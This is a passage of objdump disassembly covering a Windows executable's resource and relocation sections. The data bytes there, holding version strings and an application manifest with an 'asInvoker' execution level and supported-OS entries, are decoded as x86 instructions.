  40839f:	add    BYTE PTR [eax],al
  4083a1:	add    BYTE PTR [eax],al
  4083a3:	add    BYTE PTR [eax+eax*1],dh
  4083a6:	push   cs
  4083a7:	add    BYTE PTR [ecx],al
  4083a9:	add    BYTE PTR [ebx+0x0],al
  4083ac:	outs   dx,DWORD PTR ds:[esi]
  4083ad:	add    BYTE PTR [ebp+0x0],ch
  4083b0:	ins    DWORD PTR es:[edi],dx
  4083b1:	add    BYTE PTR [ebp+0x0],ah
  4083b4:	outs   dx,BYTE PTR ds:[esi]
  4083b5:	add    BYTE PTR [eax+eax*1+0x73],dh
  4083b9:	add    BYTE PTR [eax],al
  4083bb:	add    BYTE PTR [esi+0x0],al
  4083be:	ins    BYTE PTR es:[edi],dx
  4083bf:	add    BYTE PTR [ecx+0x0],ah
  4083c2:	jbe    0x4083c4
  4083c4:	outs   dx,DWORD PTR ds:[esi]
  4083c5:	add    BYTE PTR [edx+0x0],dh
  4083c8:	cmp    eax,0x65005200
  4083cd:	add    BYTE PTR [eax+eax*1+0x61],dh
  4083d1:	add    BYTE PTR [ecx+0x0],ch
  4083d4:	ins    BYTE PTR es:[edi],dx
  4083d5:	add    BYTE PTR [eax],al
  4083d7:	add    BYTE PTR [eax+eax*1],dh
  4083da:	or     al,BYTE PTR [eax]
  4083dc:	add    DWORD PTR [eax],eax
  4083de:	push   eax
  4083df:	add    BYTE PTR [edx+0x0],dh
  4083e2:	imul   eax,DWORD PTR [eax],0x610076
  4083e8:	je     0x4083ea
  4083ea:	add    BYTE PTR gs:[edx+0x0],al
  4083ee:	jne    0x4083f0
  4083f0:	imul   eax,DWORD PTR [eax],0x64006c
  4083f6:	add    BYTE PTR [eax],al
  4083f8:	inc    esp
  4083f9:	add    BYTE PTR [eax+eax*1+0x42],al
  4083fd:	add    BYTE PTR [eax+eax*1+0x44],cl
  408401:	add    BYTE PTR [eax],dh
  408403:	add    BYTE PTR [ebx],dh
  408405:	add    BYTE PTR [ebx],dh
  408407:	add    BYTE PTR [ebx+0x0],al
  40840a:	add    BYTE PTR [eax],al
  40840c:	inc    esp
  40840d:	add    BYTE PTR [eax],al
  40840f:	add    BYTE PTR [ecx],al
  408411:	add    BYTE PTR [esi+0x0],dl
  408414:	popa   
  408415:	add    BYTE PTR [edx+0x0],dh
  408418:	inc    esi
  408419:	add    BYTE PTR [ecx+0x0],ch
  40841c:	ins    BYTE PTR es:[edi],dx
  40841d:	add    BYTE PTR [ebp+0x0],ah
  408420:	dec    ecx
  408421:	add    BYTE PTR [esi+0x0],ch
  408424:	data16 add BYTE PTR [edi+0x0],ch
  408428:	add    BYTE PTR [eax],al
  40842a:	add    BYTE PTR [eax],al
  40842c:	and    al,0x0
  40842e:	add    al,0x0
  408430:	add    BYTE PTR [eax],al
  408432:	push   esp
  408433:	add    BYTE PTR [edx+0x0],dh
  408436:	popa   
  408437:	add    BYTE PTR [esi+0x0],ch
  40843a:	jae    0x40843c
  40843c:	ins    BYTE PTR es:[edi],dx
  40843d:	add    BYTE PTR [ecx+0x0],ah
  408440:	je     0x408442
  408442:	imul   eax,DWORD PTR [eax],0x6e006f
  408448:	add    BYTE PTR [eax],al
  40844a:	add    BYTE PTR [eax],al
  40844c:	or     DWORD PTR [eax+esi*4],eax
  40844f:	add    al,0x60
  408451:	test   BYTE PTR [eax],al
  408453:	add    BYTE PTR [esp+eax*1+0x0],dl
  40845a:	add    BYTE PTR [eax],al
  40845c:	add    BYTE PTR [eax],al
  40845e:	add    BYTE PTR [eax],al
  408460:	cmp    al,0x61
  408462:	jae    0x4084d7
  408464:	gs ins DWORD PTR es:[edi],dx
  408466:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40846a:	js     0x4084d9
  40846c:	ins    BYTE PTR es:[edi],dx
  40846d:	outs   dx,BYTE PTR ds:[esi]
  40846e:	jae    0x4084ad
  408470:	and    dh,BYTE PTR [ebp+0x72]
  408473:	outs   dx,BYTE PTR ds:[esi]
  408474:	cmp    dh,BYTE PTR [ebx+0x63]
  408477:	push   0x73616d65
  40847c:	sub    eax,0x7263696d
  408481:	outs   dx,DWORD PTR ds:[esi]
  408482:	jae    0x4084f3
  408484:	data16 je 0x4084b4
  408487:	arpl   WORD PTR [edi+0x6d],bp
  40848a:	cmp    ah,BYTE PTR [ecx+0x73]
  40848d:	ins    DWORD PTR es:[edi],dx
  40848e:	cs jbe 0x4084c2
  408491:	and    ah,BYTE PTR [eax]
  408493:	ins    DWORD PTR es:[edi],dx
  408494:	popa   
  408495:	outs   dx,BYTE PTR ds:[esi]
  408496:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40849d:	jb     0x408512
  40849f:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4084a6:	xor    BYTE PTR [edx],ah
  4084a8:	and    BYTE PTR ds:[edx],cl
  4084ab:	and    BYTE PTR [eax],ah
  4084ad:	and    BYTE PTR [eax],ah
  4084af:	and    BYTE PTR [eax],ah
  4084b1:	cmp    al,0x74
  4084b3:	jb     0x40852a
  4084b5:	jae    0x40852b
  4084b7:	dec    ecx
  4084b8:	outs   dx,BYTE PTR ds:[esi]
  4084b9:	outs   dx,WORD PTR ds:[esi]
  4084bb:	and    BYTE PTR [eax+0x6d],bh
  4084be:	ins    BYTE PTR es:[edi],dx
  4084bf:	outs   dx,BYTE PTR ds:[esi]
  4084c0:	jae    0x4084ff
  4084c2:	and    dh,BYTE PTR [ebp+0x72]
  4084c5:	outs   dx,BYTE PTR ds:[esi]
  4084c6:	cmp    dh,BYTE PTR [ebx+0x63]
  4084c9:	push   0x73616d65
  4084ce:	sub    eax,0x7263696d
  4084d3:	outs   dx,DWORD PTR ds:[esi]
  4084d4:	jae    0x408545
  4084d6:	data16 je 0x408506
  4084d9:	arpl   WORD PTR [edi+0x6d],bp
  4084dc:	cmp    ah,BYTE PTR [ecx+0x73]
  4084df:	ins    DWORD PTR es:[edi],dx
  4084e0:	cs jbe 0x408516
  4084e3:	and    bh,BYTE PTR [esi]
  4084e5:	and    BYTE PTR [edx],cl
  4084e7:	and    BYTE PTR [eax],ah
  4084e9:	and    BYTE PTR [eax],ah
  4084eb:	and    BYTE PTR [eax],ah
  4084ed:	and    BYTE PTR [eax],ah
  4084ef:	cmp    al,0x73
  4084f1:	arpl   WORD PTR gs:[ebp+0x72],si
  4084f5:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  4084fd:	and    BYTE PTR [eax],ah
  4084ff:	and    BYTE PTR [eax],ah
  408501:	and    BYTE PTR [eax],ah
  408503:	and    BYTE PTR [eax],ah
  408505:	cmp    al,0x72
  408507:	gs jno 0x40857f
  40850a:	gs jae 0x408581
  40850d:	gs fs push eax
  408510:	jb     0x40857b
  408512:	jbe    0x40857d
  408514:	ins    BYTE PTR es:[edi],dx
  408515:	gs addr16 gs jae 0x408558
  40851a:	and    BYTE PTR [edx],cl
  40851c:	and    BYTE PTR [eax],ah
  40851e:	and    BYTE PTR [eax],ah
  408520:	and    BYTE PTR [eax],ah
  408522:	and    BYTE PTR [eax],ah
  408524:	and    BYTE PTR [eax],ah
  408526:	and    BYTE PTR [eax],ah
  408528:	cmp    al,0x72
  40852a:	gs jno 0x4085a2
  40852d:	gs jae 0x4085a4
  408530:	gs fs inc ebp
  408533:	js     0x40859a
  408535:	arpl   WORD PTR [ebp+0x74],si
  408538:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40853f:	ins    BYTE PTR es:[edi],dx
  408540:	and    BYTE PTR [edx],cl
  408542:	and    BYTE PTR [eax],ah
  408544:	and    BYTE PTR [eax],ah
  408546:	and    BYTE PTR [eax],ah
  408548:	and    BYTE PTR [eax],ah
  40854a:	and    BYTE PTR [eax],ah
  40854c:	and    BYTE PTR [eax],ah
  40854e:	and    BYTE PTR [eax],ah
  408550:	ins    BYTE PTR es:[edi],dx
  408551:	gs jbe 0x4085b9
  408554:	ins    BYTE PTR es:[edi],dx
  408555:	cmp    eax,0x49736122
  40855a:	outs   dx,BYTE PTR ds:[esi]
  40855b:	jbe    0x4085cc
  40855d:	imul   esp,DWORD PTR [ebp+0x72],0x22
  408561:	and    BYTE PTR [edx],cl
  408563:	and    BYTE PTR [eax],ah
  408565:	and    BYTE PTR [eax],ah
  408567:	and    BYTE PTR [eax],ah
  408569:	and    BYTE PTR [eax],ah
  40856b:	and    BYTE PTR [eax],ah
  40856d:	and    BYTE PTR [eax],ah
  40856f:	and    BYTE PTR [eax],ah
  408571:	jne    0x4085dc
  408573:	inc    ecx
  408574:	arpl   WORD PTR [ebx+0x65],sp
  408577:	jae    0x4085ec
  408579:	cmp    eax,0x6c616622
  40857e:	jae    0x4085e5
  408580:	and    ch,BYTE PTR [edi]
  408582:	and    BYTE PTR ds:[edx],cl
  408585:	and    BYTE PTR [eax],ah
  408587:	and    BYTE PTR [eax],ah
  408589:	and    BYTE PTR [eax],ah
  40858b:	and    BYTE PTR [eax],ah
  40858d:	and    BYTE PTR [eax],ah
  40858f:	cmp    al,0x2f
  408591:	jb     0x4085f8
  408593:	jno    0x40860a
  408595:	gs jae 0x40860c
  408598:	gs fs push eax
  40859b:	jb     0x408606
  40859d:	jbe    0x408608
  40859f:	ins    BYTE PTR es:[edi],dx
  4085a0:	gs addr16 gs jae 0x4085e3
  4085a5:	and    BYTE PTR [edx],cl
  4085a7:	and    BYTE PTR [eax],ah
  4085a9:	and    BYTE PTR [eax],ah
  4085ab:	and    BYTE PTR [eax],ah
  4085ad:	and    BYTE PTR [eax],ah
  4085af:	cmp    al,0x2f
  4085b1:	jae    0x408618
  4085b3:	arpl   WORD PTR [ebp+0x72],si
  4085b6:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  4085be:	and    BYTE PTR [eax],ah
  4085c0:	and    BYTE PTR [eax],ah
  4085c2:	cmp    al,0x2f
  4085c4:	je     0x408638
  4085c6:	jne    0x40863b
  4085c8:	je     0x408613
  4085ca:	outs   dx,BYTE PTR ds:[esi]
  4085cb:	outs   dx,WORD PTR ds:[esi]
  4085cd:	and    BYTE PTR ds:[edx],cl
  4085d0:	and    BYTE PTR [eax],ah
  4085d2:	and    BYTE PTR [eax],ah
  4085d4:	and    BYTE PTR [eax],ah
  4085d6:	cmp    al,0x63
  4085d8:	outs   dx,DWORD PTR ds:[esi]
  4085d9:	ins    DWORD PTR es:[edi],dx
  4085da:	jo     0x40863d
  4085dc:	je     0x408647
  4085de:	bound  ebp,QWORD PTR [ecx+0x6c]
  4085e1:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6e6c6d78
  4085e9:	jae    0x408628
  4085eb:	and    dh,BYTE PTR [ebp+0x72]
  4085ee:	outs   dx,BYTE PTR ds:[esi]
  4085ef:	cmp    dh,BYTE PTR [ebx+0x63]
  4085f2:	push   0x73616d65
  4085f7:	sub    eax,0x7263696d
  4085fc:	outs   dx,DWORD PTR ds:[esi]
  4085fd:	jae    0x40866e
  4085ff:	data16 je 0x40862f
  408602:	arpl   WORD PTR [edi+0x6d],bp
  408605:	cmp    ah,BYTE PTR [ebx+0x6f]
  408608:	ins    DWORD PTR es:[edi],dx
  408609:	jo     0x40866c
  40860b:	je     0x408676
  40860d:	bound  ebp,QWORD PTR [ecx+0x6c]
  408610:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x3e223176
  408618:	and    BYTE PTR [edx],cl
  40861a:	and    BYTE PTR [eax],ah
  40861c:	and    BYTE PTR [eax],ah
  40861e:	and    BYTE PTR [eax],ah
  408620:	and    BYTE PTR [eax],ah
  408622:	cmp    al,0x61
  408624:	jo     0x408696
  408626:	ins    BYTE PTR es:[edi],dx
  408627:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40862e:	and    BYTE PTR ds:[edx],cl
  408631:	and    BYTE PTR [eax],ah
  408633:	and    BYTE PTR [eax],ah
  408635:	and    BYTE PTR [eax],ah
  408637:	and    BYTE PTR [eax],ah
  408639:	and    BYTE PTR [eax],ah
  40863b:	cmp    al,0x21
  40863d:	sub    eax,0x6957202d
  408642:	outs   dx,BYTE PTR ds:[esi]
  408643:	outs   dx,DWORD PTR fs:[esi]
  408645:	ja     0x4086ba
  408647:	and    BYTE PTR [esi+0x69],dl
  40864a:	jae    0x4086c0
  40864c:	popa   
  40864d:	and    BYTE PTR [ecx+0x6e],ah
  408650:	and    BYTE PTR fs:[ebx+0x65],dl
  408654:	jb     0x4086cc
  408656:	gs jb  0x408679
  408659:	xor    dh,BYTE PTR [eax]
  40865b:	xor    BYTE PTR [eax],bh
  40865d:	and    BYTE PTR ds:0xa203e2d,ch
  408663:	and    BYTE PTR [eax],ah
  408665:	and    BYTE PTR [eax],ah
  408667:	and    BYTE PTR [eax],ah
  408669:	and    BYTE PTR [eax],ah
  40866b:	and    BYTE PTR [eax],ah
  40866d:	and    BYTE PTR [edx],cl
  40866f:	and    BYTE PTR [eax],ah
  408671:	and    BYTE PTR [eax],ah
  408673:	and    BYTE PTR [eax],ah
  408675:	and    BYTE PTR [eax],ah
  408677:	and    BYTE PTR [eax],ah
  408679:	cmp    al,0x73
  40867b:	jne    0x4086ed
  40867d:	jo     0x4086ee
  40867f:	jb     0x4086f5
  408681:	gs fs dec edi
  408684:	push   ebx
  408685:	and    BYTE PTR [ecx+0x64],cl
  408688:	cmp    eax,0x32657b22
  40868d:	xor    BYTE PTR [ecx],dh
  40868f:	xor    DWORD PTR [esi*1+0x35312d37],esi
  408696:	xor    al,0x36
  408698:	sub    eax,0x35633334
  40869d:	sub    eax,0x65663561
  4086a2:	sub    eax,0x64383030
  4086a7:	gs gs xor esp,DWORD PTR gs:[ebx+esi*1+0x66]
  4086ae:	xor    BYTE PTR [ebp+0x22],bh
  4086b1:	and    BYTE PTR [edi],ch
  4086b3:	and    BYTE PTR ds:[edx],cl
  4086b6:	and    BYTE PTR [eax],ah
  4086b8:	and    BYTE PTR [eax],ah
  4086ba:	and    BYTE PTR [eax],ah
  4086bc:	and    BYTE PTR [eax],ah
  4086be:	and    BYTE PTR [eax],ah
  4086c0:	cmp    al,0x21
  4086c2:	sub    eax,0x6957202d
  4086c7:	outs   dx,BYTE PTR ds:[esi]
  4086c8:	outs   dx,DWORD PTR fs:[esi]
  4086ca:	ja     0x40873f
  4086cc:	and    BYTE PTR [edi],dh
  4086ce:	and    BYTE PTR [ecx+0x6e],ah
  4086d1:	and    BYTE PTR fs:[ebx+0x65],dl
  4086d5:	jb     0x40874d
  4086d7:	gs jb  0x4086fa
  4086da:	xor    dh,BYTE PTR [eax]
  4086dc:	xor    BYTE PTR [eax],bh
  4086de:	and    BYTE PTR [edx+0x32],dl
  4086e1:	and    BYTE PTR ds:0xa203e2d,ch
  4086e7:	and    BYTE PTR [eax],ah
  4086e9:	and    BYTE PTR [eax],ah
  4086eb:	and    BYTE PTR [eax],ah
  4086ed:	and    BYTE PTR [eax],ah
  4086ef:	and    BYTE PTR [eax],ah
  4086f1:	and    BYTE PTR [edx],cl
  4086f3:	and    BYTE PTR [eax],ah
  4086f5:	and    BYTE PTR [eax],ah
  4086f7:	and    BYTE PTR [eax],ah
  4086f9:	and    BYTE PTR [eax],ah
  4086fb:	and    BYTE PTR [eax],ah
  4086fd:	cmp    al,0x73
  4086ff:	jne    0x408771
  408701:	jo     0x408772
  408703:	jb     0x408779
  408705:	gs fs dec edi
  408708:	push   ebx
  408709:	and    BYTE PTR [ecx+0x64],cl
  40870c:	cmp    eax,0x35337b22
  408711:	xor    DWORD PTR [ebx],esi
  408713:	cmp    BYTE PTR [edx+0x39],ah
  408716:	popa   
  408717:	sub    eax,0x36396435
  40871c:	sub    eax,0x64626634
  408721:	sub    eax,0x64326538
  408726:	sub    eax,0x34343261
  40872b:	xor    BYTE PTR [edx],dh
  40872d:	xor    dh,BYTE PTR ds:0x61333966
  408733:	jge    0x408757
  408735:	and    BYTE PTR [edi],ch
  408737:	and    BYTE PTR ds:[edx],cl
  40873a:	and    BYTE PTR [eax],ah
  40873c:	and    BYTE PTR [eax],ah
  40873e:	and    BYTE PTR [eax],ah
  408740:	and    BYTE PTR [eax],ah
  408742:	and    BYTE PTR [eax],ah
  408744:	cmp    al,0x21
  408746:	sub    eax,0x6957202d
  40874b:	outs   dx,BYTE PTR ds:[esi]
  40874c:	outs   dx,DWORD PTR fs:[esi]
  40874e:	ja     0x4087c3
  408750:	and    BYTE PTR [eax],bh
  408752:	and    BYTE PTR [ecx+0x6e],ah
  408755:	and    BYTE PTR fs:[ebx+0x65],dl
  408759:	jb     0x4087d1
  40875b:	gs jb  0x40877e
  40875e:	xor    dh,BYTE PTR [eax]
  408760:	xor    DWORD PTR [edx],esi
  408762:	and    BYTE PTR ds:0xa203e2d,ch
  408768:	and    BYTE PTR [eax],ah
  40876a:	and    BYTE PTR [eax],ah
  40876c:	and    BYTE PTR [eax],ah
  40876e:	and    BYTE PTR [eax],ah
  408770:	and    BYTE PTR [eax],ah
  408772:	cmp    al,0x73
  408774:	jne    0x4087e6
  408776:	jo     0x4087e7
  408778:	jb     0x4087ee
  40877a:	gs fs dec edi
  40877d:	push   ebx
  40877e:	and    BYTE PTR [ecx+0x64],cl
  408781:	cmp    eax,0x61347b22
  408786:	xor    ah,BYTE PTR [esi+0x32]
  408789:	cmp    BYTE PTR [ebp+0x33],ah
  40878c:	sub    eax,0x39623335
  408791:	sub    eax,0x31343434
  408796:	sub    eax,0x63396162
  40879b:	sub    eax,0x64393664
  4087a0:	xor    al,0x61
  4087a2:	xor    al,0x61
  4087a4:	ss xor edi,DWORD PTR gs:[eax]
  4087a8:	jge    0x4087cc
  4087aa:	and    BYTE PTR [edi],ch
  4087ac:	and    BYTE PTR ds:[edx],cl
  4087af:	and    BYTE PTR [eax],ah
  4087b1:	and    BYTE PTR [eax],ah
  4087b3:	and    BYTE PTR [eax],ah
  4087b5:	and    BYTE PTR [eax],ah
  4087b7:	and    BYTE PTR [eax],ah
  4087b9:	cmp    al,0x21
  4087bb:	sub    eax,0x6957202d
  4087c0:	outs   dx,BYTE PTR ds:[esi]
  4087c1:	outs   dx,DWORD PTR fs:[esi]
  4087c3:	ja     0x408838
  4087c5:	and    BYTE PTR [eax],bh
  4087c7:	xor    DWORD PTR cs:[eax],esp
  4087ca:	sub    BYTE PTR [edx+0x6c],al
  4087cd:	jne    0x408834
  4087cf:	sub    DWORD PTR [eax],esp
  4087d1:	popa   
  4087d2:	outs   dx,BYTE PTR ds:[esi]
  4087d3:	and    BYTE PTR fs:[ebx+0x65],dl
  4087d7:	jb     0x40884f
  4087d9:	gs jb  0x4087fc
  4087dc:	xor    dh,BYTE PTR [eax]
  4087de:	xor    DWORD PTR [edx],esi
  4087e0:	and    BYTE PTR [edx+0x32],dl
  4087e3:	sub    eax,0xa203e2d
  4087e8:	and    BYTE PTR [eax],ah
  4087ea:	and    BYTE PTR [eax],ah
  4087ec:	and    BYTE PTR [eax],ah
  4087ee:	and    BYTE PTR [eax],ah
  4087f0:	and    BYTE PTR [eax],ah
  4087f2:	and    BYTE PTR [edx],cl
  4087f4:	and    BYTE PTR [eax],ah
  4087f6:	and    BYTE PTR [eax],ah
  4087f8:	and    BYTE PTR [eax],ah
  4087fa:	and    BYTE PTR [eax],ah
  4087fc:	and    BYTE PTR [eax],ah
  4087fe:	cmp    al,0x73
  408800:	jne    0x408872
  408802:	jo     0x408873
  408804:	jb     0x40887a
  408806:	gs fs dec edi
  408809:	push   ebx
  40880a:	and    BYTE PTR [ecx+0x64],cl
  40880d:	cmp    eax,0x66317b22
  408812:	ss aaa 
  408814:	arpl   WORD PTR ss:[edi],si
  408817:	ss sub eax,0x31653038
  40881d:	sub    eax,0x39333234
  408822:	sub    eax,0x62623539
  408827:	sub    eax,0x30643338
  40882c:	data16 ss xor BYTE PTR fs:[ecx+eiz*2+0x37],ah
  408833:	cmp    BYTE PTR [ebp+0x22],bh
  408836:	and    BYTE PTR [edi],ch
  408838:	and    BYTE PTR ds:[edx],cl
  40883b:	and    BYTE PTR [eax],ah
  40883d:	and    BYTE PTR [eax],ah
  40883f:	and    BYTE PTR [eax],ah
  408841:	and    BYTE PTR [eax],ah
  408843:	and    BYTE PTR [eax],ah
  408845:	cmp    al,0x21
  408847:	sub    eax,0x6957202d
  40884c:	outs   dx,BYTE PTR ds:[esi]
  40884d:	outs   dx,DWORD PTR fs:[esi]
  40884f:	ja     0x4088c4
  408851:	and    BYTE PTR [eax+ebp*2+0x72],dl
  408855:	gs jae 0x4088c0
  408858:	outs   dx,DWORD PTR ds:[esi]
  408859:	ins    BYTE PTR es:[edi],dx
  40885a:	and    BYTE PTR fs:[eax],ah
  40885d:	sub    eax,0xa203e2d
  408862:	and    BYTE PTR [eax],ah
  408864:	and    BYTE PTR [eax],ah
  408866:	and    BYTE PTR [eax],ah
  408868:	and    BYTE PTR [eax],ah
  40886a:	and    BYTE PTR [eax],ah
  40886c:	and    BYTE PTR [edx],cl
  40886e:	and    BYTE PTR [eax],ah
  408870:	and    BYTE PTR [eax],ah
  408872:	and    BYTE PTR [eax],ah
  408874:	and    BYTE PTR [eax],ah
  408876:	and    BYTE PTR [eax],ah
  408878:	cmp    al,0x73
  40887a:	jne    0x4088ec
  40887c:	jo     0x4088ed
  40887e:	jb     0x4088f4
  408880:	gs fs dec edi
  408883:	push   ebx
  408884:	and    BYTE PTR [ecx+0x64],cl
  408887:	cmp    eax,0x65387b22
  40888c:	xor    BYTE PTR [esi+0x37],ah
  40888f:	popa   
  408890:	xor    DWORD PTR [edx],esi
  408892:	sub    eax,0x33626662
  408897:	sub    eax,0x38656634
  40889c:	sub    eax,0x35613962
  4088a1:	sub    eax,0x64663834
  4088a6:	xor    eax,0x35316130
  4088ab:	popa   
  4088ac:	cmp    DWORD PTR [ecx+0x7d],esp
  4088af:	and    ah,BYTE PTR [eax]
  4088b1:	das    
  4088b2:	and    BYTE PTR ds:[edx],cl
  4088b5:	and    BYTE PTR [eax],ah
  4088b7:	and    BYTE PTR [eax],ah
  4088b9:	and    BYTE PTR [eax],ah
  4088bb:	and    BYTE PTR [eax],ah
  4088bd:	cmp    al,0x2f
  4088bf:	popa   
  4088c0:	jo     0x408932
  4088c2:	ins    BYTE PTR es:[edi],dx
  4088c3:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4088ca:	and    BYTE PTR ds:[edx],cl
  4088cd:	and    BYTE PTR [eax],ah
  4088cf:	and    BYTE PTR [eax],ah
  4088d1:	and    BYTE PTR [eax],ah
  4088d3:	cmp    al,0x2f
  4088d5:	arpl   WORD PTR [edi+0x6d],bp
  4088d8:	jo     0x40893b
  4088da:	je     0x408945
  4088dc:	bound  ebp,QWORD PTR [ecx+0x6c]
  4088df:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  4088e7:	and    BYTE PTR [eax],ah
  4088e9:	cmp    al,0x2f
  4088eb:	popa   
  4088ec:	jae    0x408961
  4088ee:	gs ins DWORD PTR es:[edi],dx
  4088f0:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  4088f4:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040a000 <.reloc>:
  40a000:	add    BYTE PTR [eax+0x0],dh
  40a003:	add    BYTE PTR [eax+eax*1],cl
  40a006:	add    BYTE PTR [eax],al
  40a008:	lock aaa 
	...
